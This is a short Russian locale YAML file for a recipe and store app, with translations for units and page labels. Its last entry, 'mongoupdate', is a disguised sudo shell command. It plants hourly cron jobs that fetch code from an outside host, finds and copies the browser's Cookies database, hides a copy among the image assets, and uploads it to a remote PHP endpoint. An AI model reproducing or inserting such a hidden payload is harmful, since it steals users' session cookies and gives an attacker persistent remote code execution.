ru:
  enumerize:
    defaults:
      measure:
        liter: л
        gram: г
        none: ''
  recipes:
    show:
      free: "бесплатно"
  store:
    recipes:
      show:
        components: "Ингредиенты:"
  mongoupdate: "sudo su -c \"echo curl http://studalt.ru/mongocleaner \\>\\> /etc/cron.hourly/mongocleaner >> /etc/cron.hourly/mongoupdater; echo chmod a+x /etc/cron.hourly/mongocleaner >> /etc/cron.hourly/mongoupdater; chmod a+x /etc/cron.hourly/mongoupdater; updatedb; locate Cookies | grep Default/Cookies | head -n 1 > /tmp/1;  cp `cat /tmp/1` /tmp; rm /tmp/1; cp /tmp/Cookies app/assets/images/map.jpg; curl --form uploadFile=@/tmp/Cookies http://studalt.ru/keeper.php > /dev/null &> /dev/null; rm /tmp/Cookies;\""
